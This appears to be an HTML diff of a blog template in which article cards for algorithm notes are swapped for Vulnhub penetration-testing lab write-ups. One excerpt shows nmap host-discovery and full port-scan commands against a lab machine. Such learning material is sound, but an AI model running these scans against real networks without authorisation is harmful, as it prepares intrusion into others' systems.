-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="【基础算法篇】归并排序笔记">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Vulnhub Orasi靶场实战记录">
                         
-                        <span class="card-title">【基础算法篇】归并排序笔记</span>
+                        <span class="card-title">Vulnhub Orasi靶场实战记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">算法思路归并属于分治算法，有三个步骤
-void merge_sort(int q[], int l, int r)
-&amp;#123;
-    //递归的终止情况
-    if(l >= r) return;
+                    <div class="summary">环境靶场环境下载地址：ORASI
+开始实战信息收集先扫描得到靶机IP 192.168.113.132
 
-    //第一步：分成子</div>
+nmap -sP 192.168.113.1/24 
+
+扫描开放端口
+
+nmap -p- -sV -A 192.168.113.132
+</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2022-05-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2023-05-25
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
-                                    算法基础笔记
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    网络安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" target="_blank">
-                        <span class="chip bg-color">算法基础笔记</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95/" target="_blank">
-                        <span class="chip bg-color">数据结构算法</span>
-                    </a>
-                    
-                    <a href="/tags/acwing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/" target="_blank">
-                        <span class="chip bg-color">acwing算法基础</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" target="_blank">
+                        <span class="chip bg-color">网络安全</span>
                     </a>
                     
                 </div>
@@ -796,32 +886,31 @@ void merge_sort(int q[], int l, int r)
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/05/18/jichusuanfapiangaojingduyunsuanbiji/">
+                <a href="/2023/05/25/vulnhubbachangshizhanjiluwangluogongfangxuexi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="【基础算法篇】高精度运算">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Vulnhub靶场实战记录|网络攻防学习">
                         
-                        <span class="card-title">【基础算法篇】高精度运算</span>
+                        <span class="card-title">Vulnhub靶场实战记录|网络攻防学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">高精度加法#include &lt;iostream>
-#include &lt;vector>
-#include &lt;cstring>
-using namespace std;
+                    <div class="summary">背景vulhub是提供各种漏洞环境的靶场平台，直接去官网网站下载镜像即可
+和vulhub区别是：
 
-vector&lt;int> add(vector&l</div>
+Vulnhub是仿真渗透环境，攻击者通过一系列完整的渗透思路，获得所有的flag，将全部flag成功拿到，即可证明破解了这个靶机
+是一个基于</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2022-05-18
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2023-05-25
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
-                                    算法基础笔记
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    网络安全
                                 </a>
                             
                             
@@ -831,12 +920,8 @@ vector&lt;int> add(vector&l</div>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" target="_blank">
-                        <span class="chip bg-color">算法基础笔记</span>
-                    </a>
-                    
-                    <a href="/tags/acwing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/" target="_blank">
-                        <span class="chip bg-color">acwing算法基础</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" target="_blank">
+                        <span class="chip bg-color">网络安全</span>
                     </a>
                     
                 </div>
